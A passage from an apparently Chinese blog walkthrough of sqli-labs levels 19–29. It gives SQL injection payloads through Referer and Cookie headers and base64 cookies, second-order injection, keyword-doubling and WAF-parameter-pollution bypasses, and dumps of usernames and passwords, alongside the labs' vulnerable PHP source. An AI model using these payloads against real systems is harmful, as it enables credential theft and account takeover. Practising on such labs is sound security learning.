id="19关：HTTP-头部注入-Referer"><a href="#19关：HTTP-头部注入-Referer" class="headerlink" title="19关：HTTP 头部注入 Referer"></a><strong>19关：HTTP 头部注入 Referer</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>：源码片段$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; <span class="operator">/</span><span class="operator">/</span>这里是两个值</span><br><span class="line"><span class="keyword">sql</span>注入显示<span class="keyword">Column</span> count doesn<span class="string">&#x27;t match value count at row 1，那么意味着你的值数目不对应</span></span><br><span class="line"><span class="string">比如insert into 表名 (field1,field2,field3) values(&#x27;</span>a<span class="string">&#x27;,&#x27;</span>b<span class="string">&#x27;)这样前面的是三列，后面却只有二个值，这就会出现这个错误的</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Referer: &#x27;</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>),<span class="number">1</span>)#    <span class="operator">/</span><span class="operator">/</span>这里是两个值</span><br></pre></td></tr></table></figure><h3 id="20关：HTTP-头部注入-Cookie-’-闭合-显错"><a href="#20关：HTTP-头部注入-Cookie-’-闭合-显错" class="headerlink" title="20关：HTTP 头部注入 Cookie  ’ 闭合 显错"></a><strong>20关：HTTP 头部注入 Cookie  ’ 闭合 显错</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">源码$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line">正常登录后，admin<span class="string">&#x27; 报错，说名存在SQL注入</span></span><br><span class="line"><span class="string">修改value值，必须把语句放在位置3，否则有些语句会报错(原因未知)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查所以数据库：-n&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata#</span><br><span class="line"></span><br><span class="line">查表：<span class="operator">-</span>n<span class="string">&#x27;union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查字段：-n&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br><span class="line"></span><br><span class="line">查字段内容：<span class="operator">-</span>n<span class="string">&#x27;union select 1,2,group_concat(id,0x7e,username,0x3A,password,0x7e) from security.users#</span></span><br></pre></td></tr></table></figure><h3 id="21关：HTTP-头部注入-‘）-闭合-过base64的Cookie"><a href="#21关：HTTP-头部注入-‘）-闭合-过base64的Cookie" class="headerlink" title="21关：HTTP 头部注入 ‘） 闭合 过base64的Cookie"></a><strong>21关：HTTP 头部注入 ‘） 闭合 过base64的Cookie</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码片段：$cookee <span class="operator">=</span> base64_decode($cookee); </span><br><span class="line">例如：<span class="operator">-</span>n&quot; union select 1,2,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">base64后再去执行：</span><br><span class="line">LW4iIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</span><br></pre></td></tr></table></figure><h3 id="22关：HTTP-头部注入-”-闭合-过base64的Cookie"><a href="#22关：HTTP-头部注入-”-闭合-过base64的Cookie" class="headerlink" title="22关：HTTP 头部注入 ” 闭合 过base64的Cookie"></a><strong>22关：HTTP 头部注入 ” 闭合 过base64的Cookie</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源码$cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">$cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">例如：<span class="operator">-</span>n&quot; union select 1,2,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">base64后再去执行：</span><br><span class="line">LW4iIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHNjaGVtYV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</span><br></pre></td></tr></table></figure><h3 id="23关：get-请求-过滤了注释符-显错注入"><a href="#23关：get-请求-过滤了注释符-显错注入" class="headerlink" title="23关：get 请求 过滤了注释符  显错注入"></a><strong>23关：get 请求 过滤了注释符  显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">源码片段：</span><br><span class="line">$reg <span class="operator">=</span> &quot;/#/&quot;;</span><br><span class="line">$reg1 <span class="operator">=</span> &quot;/--/&quot;;</span><br><span class="line">$replace <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">将注释符过滤为空不能像以前那样</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3-- -</span></span><br><span class="line"><span class="string">此处的sql语句为</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),3-- -&#x27;</span>limit <span class="number">0</span>,<span class="number">1</span>（<span class="comment">-- -后面的语句就会被忽略）</span></span><br><span class="line"></span><br><span class="line">解决办法<span class="number">1</span>：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select database()),&#x27;</span><span class="number">3</span></span><br><span class="line">此处的<span class="keyword">sql</span>语句为</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;3&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>(这样整个句子就通了，只要通了就能运行)</span><br><span class="line"></span><br><span class="line">解决办法<span class="number">2</span>：?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(username),group_concat(password) from users where 1 or &#x27;</span><span class="number">1</span><span class="string">&#x27; = &#x27;</span></span><br><span class="line">此处的<span class="keyword">sql</span>语句为</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username),group_concat(password) <span class="keyword">from</span> users <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">语句通顺就是可以运行的</span><br></pre></td></tr></table></figure><h3 id="24关：二次注入"><a href="#24关：二次注入" class="headerlink" title="24关：二次注入"></a><strong>24关：二次注入</strong></h3><p>数据进库是没有执行，在出库时才被执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>先注册一个admin<span class="string">&#x27; #的账号。</span></span><br><span class="line"><span class="string">2.登录admin&#x27;</span>#，修改该账号的密码，此时修改的就是admin的密码。<span class="keyword">Sql</span>语句变为 UPDATE users <span class="keyword">SET</span> passwd<span class="operator">=</span>&quot;New_Pass&quot; <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>#<span class="string">&#x27;AND password=&#x27;</span></span><br><span class="line">也就是执行了UPDATE users <span class="keyword">SET</span> passwd<span class="operator">=</span><span class="string">&#x27;New_Pass&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line">成功的话页面会提示Password successfully updated</span><br></pre></td></tr></table></figure><h3 id="25关：and-和-or-被过滤-显错注入"><a href="#25关：and-和-or-被过滤-显错注入" class="headerlink" title="25关：and 和 or 被过滤 显错注入"></a><strong>25关：and 和 or 被过滤 显错注入</strong></h3><p>尝试大小写绕过失败</p><p>过滤方法：双写 </p><p>还可以用对应符号代替 or = || ，and = &amp;&amp;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; oorrder by 4-- - //查列数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">-- - //查数据库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; aandnd table_name=&#x27;</span>users<span class="string">&#x27;-- - //查字段数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(id,<span class="number">0x7e</span>,username,<span class="number">0x3A</span>,passwoorrd,<span class="number">0x7e</span>) <span class="keyword">from</span> security.users<span class="comment">-- - //字段内容</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="25a关：和25方法一样，只是这是数字型-显错注入"><a href="#25a关：和25方法一样，只是这是数字型-显错注入" class="headerlink" title="25a关：和25方法一样，只是这是数字型 显错注入"></a><strong>25a关：和25方法一样，只是这是数字型 显错注入</strong></h3><p>就是不用闭合</p><h3 id="26关：过滤了-or，and-，-–-空格-报错注入，显错注入"><a href="#26关：过滤了-or，and-，-–-空格-报错注入，显错注入" class="headerlink" title="26关：过滤了 or，and ， / , – , # , 空格 , /   报错注入，显错注入*"></a><em><em>26关：过滤了 or，and ， /</em> , – , # , 空格 , /   报错注入，显错注入</em>*</h3><p>空格：</p><p>使用 %0A 替代空格，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”</p><p>闭合：</p><p>在语句尾部构造 ‘  或 %00注释</p><p>使用报错注入，函数内不需要考虑空格</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  <span class="operator">/</span><span class="operator">/</span>查数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1, concat(0x7e, (SELECT (group_concat(table_name)) FROM (infoorrmation_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(1,(SELECT (group_concat(column_name)) FROM (infoorrmation_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27; %26%26 table_name = &#x27;</span>users<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x0a,(SELECT(group_concat(concat_ws(0x3a,username,passwoorrd))) FROM (security.users) WHERE (id = 1) ))  ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据 调整id<span class="operator">=</span>n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="26a关：闭合多一个括号-‘-报错注入，显错注入"><a href="#26a关：闭合多一个括号-‘-报错注入，显错注入" class="headerlink" title="26a关：闭合多一个括号 ‘) 报错注入，显错注入"></a><strong>26a关：闭合多一个括号 ‘) 报错注入，显错注入</strong></h3><p>payload 可以和26一样(报错)，也可以和27a一样(显错)</p><h3 id="27关：过滤-关键字-union-和-select-报错注入"><a href="#27关：过滤-关键字-union-和-select-报错注入" class="headerlink" title="27关：过滤 关键字 union 和 select 报错注入"></a><strong>27关：过滤 关键字 union 和 select 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">过滤</span><br><span class="line"><span class="keyword">function</span> blacklist($id)&#123;</span><br><span class="line">    $id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);     <span class="operator">/</span><span class="operator">/</span>过滤 <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);       //过滤 --.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);        //过滤 #.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);       //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);       //过滤 spaces.</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;, $id);     //过滤 union</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;, $id);    //过滤 select</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;, $id);     //过滤 UNION</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;, $id);    //过滤 SELECT</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;, $id);     //过滤 Union</span></span><br><span class="line"><span class="comment">    $id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;, $id);    //过滤 select</span></span><br><span class="line"><span class="comment">    return $id;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>使用<strong>大小写</strong>或者<strong>双写</strong>绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">同样使用 updataxml 报错注入，函数内避开空格过滤</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x7e,database()),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查当前数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; || updatexml(1, concat(0x7e, (SElect (group_concat(table_name)) FROM (information_schema.tables) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;||updatexml(1,concat(1,(SElect(group_concat(column_name)) FROM (information_schema.columns) WHERE (table_schema=&#x27;</span>security<span class="string">&#x27; %26%26 table_name = &#x27;</span>users<span class="string">&#x27;))) ,1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; || updatexml(1,concat(0x0a,(SElect(group_concat(concat_ws(0x3a,username,password))) FROM (security.users) WHERE (id = 4) )),1) || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据 调整id<span class="operator">=</span>n</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="27a关：只是闭合方式不一样-显错注入"><a href="#27a关：只是闭合方式不一样-显错注入" class="headerlink" title="27a关：只是闭合方式不一样 显错注入"></a><strong>27a关：只是闭合方式不一样 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,2,3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查显示位</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span><span class="operator">/</span><span class="operator">/</span>全库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;security&#x27;%0Aand%0Atable_name=&#x27;users&#x27;),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span>&quot;%0AUNiON%0ASElECT%0A1,(SElect%0Agroup_concat(&#x27;~&#x27;,id,&#x27;.&#x27;,username,&#x27;.&#x27;,password,&#x27;.&#x27;)%0Afrom%0Asecurity.users),3%0Aor%0A&quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据</span><br></pre></td></tr></table></figure><h3 id="28关：过滤-union-select-组合-显错注入"><a href="#28关：过滤-union-select-组合-显错注入" class="headerlink" title="28关：过滤 union select 组合 显错注入"></a><strong>28关：过滤 union select 组合 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);              <span class="operator">/</span><span class="operator">/</span>过滤 <span class="comment">/*</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);                //过滤 --.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);                 //过滤 #.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                //过滤 spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);           //过滤 spaces.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);                //过滤 spaces.</span></span><br><span class="line"><span class="comment">$id= preg_replace(&#x27;/union\s+select/i&#x27;,&quot;&quot;, $id);     //过滤 UNION &amp; SELECT.</span></span><br><span class="line"><span class="comment">return $id;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p>双写绕过union select：un<strong>union select</strong>ion select</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,database(),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(schema_name)%0Afrom%0Ainformation_schema.schemata),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>全库</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;</span>security<span class="string">&#x27;),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查表</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;</span>security<span class="string">&#x27;%0Aand%0Atable_name=&#x27;</span>users<span class="string">&#x27;),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span> 查字段</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">9999</span><span class="string">&#x27;)ununion%0Aselection%0Aselect%0A1,(select%0Agroup_concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,id,&#x27;</span>.<span class="string">&#x27;,username,&#x27;</span>.<span class="string">&#x27;,password,&#x27;</span>.<span class="string">&#x27;)%0Afrom%0Asecurity.users),3||(&#x27;</span><span class="number">1</span><span class="string">&#x27;)=(&#x27;</span><span class="number">1</span> <span class="operator">/</span><span class="operator">/</span>查数据</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="29关：有WAF-对参数进行高效过滤"><a href="#29关：有WAF-对参数进行高效过滤" class="headerlink" title="29关：有WAF 对参数进行高效过滤"></a><strong>29关：有WAF 对参数进行高效过滤</strong></h3><p>‘  闭合</p><p>绕过的方法是 **HPP (HTTP Parameter Pollution)**，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span> <span class="operator">/</span><span class="operator">/</span>两个参数</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span><span class="string">&#x27; order by 99999-- - //查字段数</span></span><br><span class="line"><span class="string">往下是和第一关一样的payload （简单）</span></span><br></pre></td></tr></table></figure><p>源码如下，源码通过了 java_implimentation() 方法获取到了 id 参数。接着源码使用 GET 方法获取 id 参数，并通过  whitelist() 方法判断参数是否合法。注意我们在上面传入了 2 个同名参数，使用 GET 方法获取到的是后面的参数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> take the variables </span><br><span class="line">if(isset($_GET[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">      $qs <span class="operator">=</span> $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">      $hint <span class="operator">=</span> $qs;</span><br><span class="line">      $id1 <span class="operator">=</span> java_implimentation($qs);</span><br><span class="line">      $id <span class="operator">=</span> $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span>echo $id1;</span><br><span class="line">      whitelist($id1);</span><br><span class="line"> </span><br><span class="line">      <span class="operator">/</span><span class="operator">/</span> connectivity </span><br><span class="line">      $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">      $<span class="keyword">result</span> <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">      $<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line">      if($<span class="type">row</span>)</span><br><span class="line">      &#123;</span><br><span class="line">            echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;</span><br><span class="line">    echo <span class="string">&#x27;Your Login name:&#x27;</span>. $<span class="type">row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo 